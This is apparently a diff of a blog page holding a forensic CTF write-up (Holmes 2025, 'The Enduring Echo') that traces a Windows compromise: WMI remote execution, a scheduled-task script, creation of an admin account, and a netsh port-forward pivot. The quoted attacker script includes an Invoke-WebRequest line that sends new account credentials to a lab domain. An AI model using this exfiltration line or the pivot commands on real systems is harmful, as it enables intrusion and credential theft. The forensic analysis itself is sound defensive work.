@@ -145,35 +145,8 @@ This article does not have a corresponding language version
 <div class="sidebar-toc-wrapper toc-div-class">
   <nav id="TableOfContents">
   <ul>
-    <li><a href="#question-1">Question 1</a></li>
-    <li><a href="#question-2">Question 2:</a></li>
-    <li><a href="#question-3">Question 3:</a></li>
-    <li><a href="#question-4">Question 4:</a></li>
-    <li><a href="#question-5">Question 5:</a></li>
-    <li><a href="#question-6">Question 6:</a></li>
-    <li><a href="#question-7">Question 7:</a></li>
-    <li><a href="#question-8">Question 8:</a></li>
-    <li><a href="#question-9">Question 9:</a></li>
-    <li><a href="#question-10">Question 10:</a></li>
-    <li><a href="#question-11">Question 11:</a></li>
-    <li><a href="#question-12">Question 12:</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#question-1what-was-the-first-non-cd-command-executed-by-the-attacker-on-the-host-string">Question 1:What was the first (non cd) command executed by the attacker on the host? (string)</a></li>
-    <li><a href="#question-2-which-parent-process-full-path-spawned-the-attackers-commands-cfolderpathfileext">Question 2: Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)</a></li>
-    <li><a href="#question-3which-remote-execution-tool-was-most-likely-used-for-the-attack-filenameext">Question 3:Which remote-execution tool was most likely used for the attack? (filename.ext)</a></li>
-    <li><a href="#question-4-what-was-the-attackers-ip-address-ipv4-address">Question 4: What was the attacker’s IP address? (IPv4 address)</a></li>
-    <li><a href="#question-5what-is-the-first-element-in-the-attackers-sequence-of-persistence-mechanisms-string">Question 5:What is the first element in the attacker&rsquo;s sequence of persistence mechanisms? (string)</a></li>
-    <li><a href="#question-6identify-the-script-executed-by-the-persistence-mechanism-cfolderpathfileext">Question 6:Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)</a></li>
-    <li><a href="#question-7what-local-account-did-the-attacker-create-string">Question 7:What local account did the attacker create? (string)</a></li>
-    <li><a href="#question-8-what-domain-name-did-the-attacker-use-for-credential-exfiltration-domain">Question 8: What domain name did the attacker use for credential exfiltration? (domain)</a></li>
-    <li><a href="#question-9-what-password-did-the-attackers-script-generate-for-the-newly-created-user-string">Question 9: What password did the attacker&rsquo;s script generate for the newly created user? (string)</a></li>
-    <li><a href="#question-10-what-was-the-ip-address-of-the-internal-system-the-attacker-pivoted-to-ipv4-address">Question 10: What was the IP address of the internal system the attacker pivoted to? (IPv4 address)</a></li>
-    <li><a href="#question-11-which-tcp-port-on-the-victim-was-forwarded-to-enable-the-pivot-port-0-65565">Question 11: Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)</a></li>
-    <li><a href="#question-12-what-is-the-full-registry-path-that-stores-persistent-ipv4ipv4-tcp-listener-to-target-mappings-hklm">Question 12: What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM......)</a></li>
-    <li><a href="#question-13-what-is-the-mitre-attck-id-associated-with-the-previous-technique-used-by-the-attacker-to-pivot-to-the-internal-system-txxxxxxx">Question 13: What is the MITRE ATT&amp;CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)</a></li>
-    <li><a href="#question-14-before-the-attack-the-administrator-configured-windows-to-capture-command-line-details-in-the-event-logs-what-command-did-they-run-to-achieve-this-command">Question 14: Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)</a></li>
+    <li><a href="#holmes-ctf-2025--the-card">Holmes CTF 2025 – The Card</a></li>
+    <li><a href="#holmes-ctf-2025--the-enduring-echo">Holmes CTF 2025 – The Enduring Echo</a></li>
   </ul>
 </nav>
 </div></div>
@@ -587,11 +560,12 @@ Holmes CTF 2025 – The Enduring Echo
 </h1><p>Challenge name:<strong>The Enduring Echo</strong>
 Difficulty:<strong>Easy</strong>
 Describe:LeStrade passes a disk image artifacts to Watson. It&rsquo;s one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.</p>
-<h2 id="question-1what-was-the-first-non-cd-command-executed-by-the-attacker-on-the-host-string">
-<a class="header-anchor" href="#question-1what-was-the-first-non-cd-command-executed-by-the-attacker-on-the-host-string"></a>
-Question 1:What was the first (non cd) command executed by the attacker on the host? (string)
-</h2><p><strong>Evidence &amp; where it was found</strong></p>
-<p><img src="images/holmes_2025/the_enduring_echo/anh1.png" alt="Organization Evidence"></p>
+<h2 id="question-1-1">
+<a class="header-anchor" href="#question-1-1"></a>
+Question 1:
+</h2><p>What was the first (non cd) command executed by the attacker on the host? (string)</p>
+<p><strong>Evidence &amp; where it was found</strong></p>
+<p><img src="/images/holmes_2025/the_enduring_echo/anh1.png" alt="Organization Evidence"></p>
 <ul>
 <li>I located the process creation event in the Windows Security log (Event ID 4688 — A new process has been created).</li>
 <li>The NewProcessName is C:\Windows\System32\cmd.exe</li>
@@ -628,16 +602,18 @@ Question 1:What was the first (non cd) command executed by the attacker on the h
 <p><strong>onclusion:</strong></p>
 <p>The first User-Agent used by the attacker is:</p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">systeminfo
-</code></pre><h2 id="question-2-which-parent-process-full-path-spawned-the-attackers-commands-cfolderpathfileext">
-<a class="header-anchor" href="#question-2-which-parent-process-full-path-spawned-the-attackers-commands-cfolderpathfileext"></a>
-Question 2: Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)
-</h2><p>-Similarly, in question 1, the answer is</p>
+</code></pre><h2 id="question-2-1">
+<a class="header-anchor" href="#question-2-1"></a>
+Question 2:
+</h2><p>Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)
+-Similarly, in question 1, the answer is</p>
 <p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">C:\Windows\System32\wbem\WmiPrvSE.exe
-</code></pre><h2 id="question-3which-remote-execution-tool-was-most-likely-used-for-the-attack-filenameext">
-<a class="header-anchor" href="#question-3which-remote-execution-tool-was-most-likely-used-for-the-attack-filenameext"></a>
-Question 3:Which remote-execution tool was most likely used for the attack? (filename.ext)
-</h2><p><strong>Conclusion:</strong></p>
+</code></pre><h2 id="question-3-1">
+<a class="header-anchor" href="#question-3-1"></a>
+Question 3:
+</h2><p>Which remote-execution tool was most likely used for the attack? (filename.ext)</p>
+<p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">wmiexec.py
 </code></pre><p><strong>Evidence &amp; where it was found</strong></p>
 <ol>
@@ -686,11 +662,12 @@ strongly points to a WMI-based remote execution technique.</li>
 <p>Using wmiexec.py provides a non-interactive, stealthy channel to run commands without an interactive shell, which reduces noise and leaves a trail primarily in event logs (4688) rather than interactive user logs.</p>
 </li>
 </ol>
-<h2 id="question-4-what-was-the-attackers-ip-address-ipv4-address">
-<a class="header-anchor" href="#question-4-what-was-the-attackers-ip-address-ipv4-address"></a>
-Question 4: What was the attacker’s IP address? (IPv4 address)
-</h2><p><strong>Evidence &amp; where it was found</strong></p>
-<p><img src="images/holmes_2025/the_enduring_echo/anh2.png" alt="Organization Evidence"></p>
+<h2 id="question-4-1">
+<a class="header-anchor" href="#question-4-1"></a>
+Question 4:
+</h2><p>What was the attacker’s IP address? (IPv4 address)</p>
+<p><strong>Evidence &amp; where it was found</strong></p>
+<p><img src="/images/holmes_2025/the_enduring_echo/anh2.png" alt="Organization Evidence"></p>
 <ol>
 <li>
 <p>I examined the relevant Windows Security Event (Event ID 4688 — A new process has been created).</p>
@@ -738,11 +715,12 @@ Question 4: What was the attacker’s IP address? (IPv4 address)
 </ol>
 <p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">10.129.242.110
-</code></pre><h2 id="question-5what-is-the-first-element-in-the-attackers-sequence-of-persistence-mechanisms-string">
-<a class="header-anchor" href="#question-5what-is-the-first-element-in-the-attackers-sequence-of-persistence-mechanisms-string"></a>
-Question 5:What is the first element in the attacker&rsquo;s sequence of persistence mechanisms? (string)
-</h2><p><strong>Evidence &amp; where it was found</strong></p>
-<p><img src="images/holmes_2025/the_enduring_echo/anh3.png" alt="Organization Evidence"></p>
+</code></pre><h2 id="question-5-1">
+<a class="header-anchor" href="#question-5-1"></a>
+Question 5:
+</h2><p>What is the first element in the attacker&rsquo;s sequence of persistence mechanisms? (string)</p>
+<p><strong>Evidence &amp; where it was found</strong></p>
+<p><img src="/images/holmes_2025/the_enduring_echo/anh3.png" alt="Organization Evidence"></p>
 <ol>
 <li>
 <p>I inspected the relevant Windows Security Event (Event ID 4688 — A new process has been created).</p>
@@ -792,16 +770,18 @@ Question 5:What is the first element in the attacker&rsquo;s sequence of persist
 </ol>
 <p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">SysHelper Update
-</code></pre><h2 id="question-6identify-the-script-executed-by-the-persistence-mechanism-cfolderpathfileext">
-<a class="header-anchor" href="#question-6identify-the-script-executed-by-the-persistence-mechanism-cfolderpathfileext"></a>
-Question 6:Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)
-</h2><p>-Similarly, in question 5, the answer is</p>
+</code></pre><h2 id="question-6-1">
+<a class="header-anchor" href="#question-6-1"></a>
+Question 6:
+</h2><p>Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)</p>
+<p>-Similarly, in question 5, the answer is</p>
 <p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">C:\Users\Werni\Appdata\Local\JM.ps1
-</code></pre><h2 id="question-7what-local-account-did-the-attacker-create-string">
-<a class="header-anchor" href="#question-7what-local-account-did-the-attacker-create-string"></a>
-Question 7:What local account did the attacker create? (string)
-</h2><p><strong>Evidence &amp; where it was found</strong></p>
+</code></pre><h2 id="question-7-1">
+<a class="header-anchor" href="#question-7-1"></a>
+Question 7:
+</h2><p>What local account did the attacker create? (string)</p>
+<p><strong>Evidence &amp; where it was found</strong></p>
 <ol>
 <li>Windows Security log (Event ID 4720 — User Account Created):</li>
 </ol>
@@ -839,7 +819,7 @@ if (-not $existing) {
     Enable-NetFirewallRule -DisplayGroup &#34;Remote Desktop&#34;
     Invoke-WebRequest -Uri &#34;http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(&#34;$newUser|$password&#34;)))&#34; -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
 }
-</code></pre><p><img src="images/holmes_2025/the_enduring_echo/anh3.png" alt="Organization Evidence"></p>
+</code></pre><p><img src="/images/holmes_2025/the_enduring_echo/anh3.png" alt="Organization Evidence"></p>
 <p>-and logic that checks for existing users and, if none exist, picks one at random:
 -That shows the script’s intent: create a user from that list, add it to the Administrators and Remote Desktop Users groups.</p>
 <ol start="3">
@@ -870,10 +850,11 @@ if (-not $existing) {
 </code></pre><p>So not only was the account created, its credentials were likely sent to the attacker-controlled host.
 <strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">svc_netupd
-</code></pre><h2 id="question-8-what-domain-name-did-the-attacker-use-for-credential-exfiltration-domain">
-<a class="header-anchor" href="#question-8-what-domain-name-did-the-attacker-use-for-credential-exfiltration-domain"></a>
-Question 8: What domain name did the attacker use for credential exfiltration? (domain)
-</h2><p><strong>Evidence &amp; where it was found</strong></p>
+</code></pre><h2 id="question-8-1">
+<a class="header-anchor" href="#question-8-1"></a>
+Question 8:
+</h2><p>What domain name did the attacker use for credential exfiltration? (domain)</p>
+<p><strong>Evidence &amp; where it was found</strong></p>
 <ul>
 <li>The malicious PowerShell script JM.ps1 recovered from C:\Users\Werni\AppData\Local\JM.ps1 contains this line near the end of the script:</li>
 </ul>
@@ -892,10 +873,11 @@ Question 8: What domain name did the attacker use for credential exfiltration? (
 </ul>
 <p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">NapoleonsBlackPearl.htb
-</code></pre><h2 id="question-9-what-password-did-the-attackers-script-generate-for-the-newly-created-user-string">
-<a class="header-anchor" href="#question-9-what-password-did-the-attackers-script-generate-for-the-newly-created-user-string"></a>
-Question 9: What password did the attacker&rsquo;s script generate for the newly created user? (string)
-</h2><p><strong>Evidence &amp; where it was found</strong></p>
+</code></pre><h2 id="question-9-1">
+<a class="header-anchor" href="#question-9-1"></a>
+Question 9:
+</h2><p>What password did the attacker&rsquo;s script generate for the newly created user? (string)</p>
+<p><strong>Evidence &amp; where it was found</strong></p>
 <p>1 . Malicious script (JM.ps1) — recovered from C:\Users\Werni\AppData\Local\JM.ps1:
 The script contains these lines (paraphrased):</p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">$timestamp = (Get-Date).ToString(&#34;yyyyMMddHHmmss&#34;)
@@ -916,20 +898,21 @@ New-LocalUser -Name $newUser -Password $securePass ...
 </code></pre><ul>
 <li>This event corresponds to the account creation (TargetUserName svc_netupd). The SystemTime value is in UTC.</li>
 </ul>
-<p><img src="images/holmes_2025/the_enduring_echo/anh5.png" alt="Organization Evidence">
+<p><img src="/images/holmes_2025/the_enduring_echo/anh5.png" alt="Organization Evidence">
 3. Timezone / timestamp adjustment — The forensic view of the host shows the system time zone is Pacific Time (ActiveTimeBias 420), which is UTC−07:00. Converting the UTC event time 2025-08-24T23:05:09Z to local Pacific time gives 2025-08-24 16:05:09. Formatting that local time as yyyyMMddHHmmss produces 20250824160509. Prepending Watson_ yields the final password: Watson_20250824160509.</p>
 <p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">Watson_20250824160509
-</code></pre><h2 id="question-10-what-was-the-ip-address-of-the-internal-system-the-attacker-pivoted-to-ipv4-address">
-<a class="header-anchor" href="#question-10-what-was-the-ip-address-of-the-internal-system-the-attacker-pivoted-to-ipv4-address"></a>
-Question 10: What was the IP address of the internal system the attacker pivoted to? (IPv4 address)
-</h2><p><strong>Evidence &amp; where it was found</strong></p>
+</code></pre><h2 id="question-10-1">
+<a class="header-anchor" href="#question-10-1"></a>
+Question 10:
+</h2><p>What was the IP address of the internal system the attacker pivoted to? (IPv4 address)</p>
+<p><strong>Evidence &amp; where it was found</strong></p>
 <ul>
 <li>he Windows Security Event (Event ID 4688 — A new process has been created) shows the attacker executed netsh.exe.</li>
 <li>The CommandLine field contains:</li>
 </ul>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22
-</code></pre><p><img src="images/holmes_2025/the_enduring_echo/anh6.png" alt="Organization Evidence"></p>
+</code></pre><p><img src="/images/holmes_2025/the_enduring_echo/anh6.png" alt="Organization Evidence"></p>
 <ul>
 <li>This command explicitly sets up a port forwarding rule that forwards local traffic on port 9999 (listening on all interfaces 0.0.0.0) to 192.168.1.101:22 (SSH on the internal host). The connectaddress=192.168.1.101 value is the pivot target.</li>
 </ul>
@@ -941,16 +924,18 @@ Question 10: What was the IP address of the internal system the attacker pivoted
 </ul>
 <p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">192.168.1.101
-</code></pre><h2 id="question-11-which-tcp-port-on-the-victim-was-forwarded-to-enable-the-pivot-port-0-65565">
-<a class="header-anchor" href="#question-11-which-tcp-port-on-the-victim-was-forwarded-to-enable-the-pivot-port-0-65565"></a>
-Question 11: Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)
-</h2><p>-Similarly, in question 10, the answer is
+</code></pre><h2 id="question-11-1">
+<a class="header-anchor" href="#question-11-1"></a>
+Question 11:
+</h2><p>Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)</p>
+<p>-Similarly, in question 10, the answer is
 <strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">9999
-</code></pre><h2 id="question-12-what-is-the-full-registry-path-that-stores-persistent-ipv4ipv4-tcp-listener-to-target-mappings-hklm">
-<a class="header-anchor" href="#question-12-what-is-the-full-registry-path-that-stores-persistent-ipv4ipv4-tcp-listener-to-target-mappings-hklm"></a>
-Question 12: What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM......)
-</h2><p><strong>Analysis</strong></p>
+</code></pre><h2 id="question-12-1">
+<a class="header-anchor" href="#question-12-1"></a>
+Question 12:
+</h2><p>What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM......)</p>
+<p><strong>Analysis</strong></p>
 <ul>
 <li>When attackers configure port forwarding on a Windows host using the command:</li>
 </ul>
@@ -961,10 +946,11 @@ Question 12: What is the full registry path that stores persistent IPv4→IPv4 T
 </ul>
 <p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
-</code></pre><h2 id="question-13-what-is-the-mitre-attck-id-associated-with-the-previous-technique-used-by-the-attacker-to-pivot-to-the-internal-system-txxxxxxx">
-<a class="header-anchor" href="#question-13-what-is-the-mitre-attck-id-associated-with-the-previous-technique-used-by-the-attacker-to-pivot-to-the-internal-system-txxxxxxx"></a>
-Question 13: What is the MITRE ATT&amp;CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)
-</h2><p><strong>Analysis</strong></p>
+</code></pre><h2 id="question-13">
+<a class="header-anchor" href="#question-13"></a>
+Question 13:
+</h2><p>What is the MITRE ATT&amp;CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)</p>
+<p><strong>Analysis</strong></p>
 <ol>
 <li>
 <p>From Question 12, we determined the attacker configured persistent port forwarding using the Windows netsh interface portproxy feature. This technique allows them to redirect traffic from one IP/port to another, enabling lateral movement or pivoting into internal systems</p>
@@ -980,10 +966,11 @@ Question 13: What is the MITRE ATT&amp;CK ID associated with the previous techni
 </ul>
 <p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">T1090.001
-</code></pre><h2 id="question-14-before-the-attack-the-administrator-configured-windows-to-capture-command-line-details-in-the-event-logs-what-command-did-they-run-to-achieve-this-command">
-<a class="header-anchor" href="#question-14-before-the-attack-the-administrator-configured-windows-to-capture-command-line-details-in-the-event-logs-what-command-did-they-run-to-achieve-this-command"></a>
-Question 14: Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)
-</h2><p><strong>Evidence &amp; where it was found</strong></p>
+</code></pre><h2 id="question-14">
+<a class="header-anchor" href="#question-14"></a>
+Question 14:
+</h2><p>Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)</p>
+<p><strong>Evidence &amp; where it was found</strong></p>
 <ul>
 <li>In the forensic output (ConsoleHost_history and other collected text artifacts shown in Autopsy), the command appears verbatim among the recorded administrator commands. The extracted text window includes the reg add invocation used to enable command-line capture.</li>
 <li>Additional contextual evidence: subsequent security events (Event ID 4688) in the provided logs contain full CommandLine fields for cmd.exe/powershell.exe invocations, showing that command-line auditing was indeed active when the attacker executed commands.
@@ -1000,7 +987,7 @@ it allowed investigators to identify attacker TTPs (WMI remote execution, schedu
 <li>From an operational perspective, organizations should balance the value of detailed logging with storage and privacy considerations (command lines can include sensitive data). The registry change is a deliberate, system-level switch and should be documented and monitored.</li>
 <li>Attackers are less likely to hide their behavior when command-line logging is enabled — it makes post-compromise detection and attribution much easier.</li>
 </ul>
-<p><img src="images/holmes_2025/the_enduring_echo/anh7.png" alt="Organization Evidence"></p>
+<p><img src="/images/holmes_2025/the_enduring_echo/anh7.png" alt="Organization Evidence"></p>
 <p><strong>Conclusion:</strong></p>
 <pre tabindex="0"><code class="language-velocity" data-lang="velocity">reg add &#34;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit&#34; /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1
 </code></pre></div>
@@ -1055,35 +1042,8 @@ it allowed investigators to identify attacker TTPs (WMI remote execution, schedu
 <div class="sidebar-toc-wrapper toc-div-class">
   <nav id="TableOfContents">
   <ul>
-    <li><a href="#question-1">Question 1</a></li>
-    <li><a href="#question-2">Question 2:</a></li>
-    <li><a href="#question-3">Question 3:</a></li>
-    <li><a href="#question-4">Question 4:</a></li>
-    <li><a href="#question-5">Question 5:</a></li>
-    <li><a href="#question-6">Question 6:</a></li>
-    <li><a href="#question-7">Question 7:</a></li>
-    <li><a href="#question-8">Question 8:</a></li>
-    <li><a href="#question-9">Question 9:</a></li>
-    <li><a href="#question-10">Question 10:</a></li>
-    <li><a href="#question-11">Question 11:</a></li>
-    <li><a href="#question-12">Question 12:</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#question-1what-was-the-first-non-cd-command-executed-by-the-attacker-on-the-host-string">Question 1:What was the first (non cd) command executed by the attacker on the host? (string)</a></li>
-    <li><a href="#question-2-which-parent-process-full-path-spawned-the-attackers-commands-cfolderpathfileext">Question 2: Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)</a></li>
-    <li><a href="#question-3which-remote-execution-tool-was-most-likely-used-for-the-attack-filenameext">Question 3:Which remote-execution tool was most likely used for the attack? (filename.ext)</a></li>
-    <li><a href="#question-4-what-was-the-attackers-ip-address-ipv4-address">Question 4: What was the attacker’s IP address? (IPv4 address)</a></li>
-    <li><a href="#question-5what-is-the-first-element-in-the-attackers-sequence-of-persistence-mechanisms-string">Question 5:What is the first element in the attacker&rsquo;s sequence of persistence mechanisms? (string)</a></li>
-    <li><a href="#question-6identify-the-script-executed-by-the-persistence-mechanism-cfolderpathfileext">Question 6:Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)</a></li>
-    <li><a href="#question-7what-local-account-did-the-attacker-create-string">Question 7:What local account did the attacker create? (string)</a></li>
-    <li><a href="#question-8-what-domain-name-did-the-attacker-use-for-credential-exfiltration-domain">Question 8: What domain name did the attacker use for credential exfiltration? (domain)</a></li>
-    <li><a href="#question-9-what-password-did-the-attackers-script-generate-for-the-newly-created-user-string">Question 9: What password did the attacker&rsquo;s script generate for the newly created user? (string)</a></li>
-    <li><a href="#question-10-what-was-the-ip-address-of-the-internal-system-the-attacker-pivoted-to-ipv4-address">Question 10: What was the IP address of the internal system the attacker pivoted to? (IPv4 address)</a></li>
-    <li><a href="#question-11-which-tcp-port-on-the-victim-was-forwarded-to-enable-the-pivot-port-0-65565">Question 11: Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)</a></li>
-    <li><a href="#question-12-what-is-the-full-registry-path-that-stores-persistent-ipv4ipv4-tcp-listener-to-target-mappings-hklm">Question 12: What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM......)</a></li>
-    <li><a href="#question-13-what-is-the-mitre-attck-id-associated-with-the-previous-technique-used-by-the-attacker-to-pivot-to-the-internal-system-txxxxxxx">Question 13: What is the MITRE ATT&amp;CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)</a></li>
-    <li><a href="#question-14-before-the-attack-the-administrator-configured-windows-to-capture-command-line-details-in-the-event-logs-what-command-did-they-run-to-achieve-this-command">Question 14: Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)</a></li>
+    <li><a href="#holmes-ctf-2025--the-card">Holmes CTF 2025 – The Card</a></li>
+    <li><a href="#holmes-ctf-2025--the-enduring-echo">Holmes CTF 2025 – The Enduring Echo</a></li>
   </ul>
 </nav>
 </div></div>
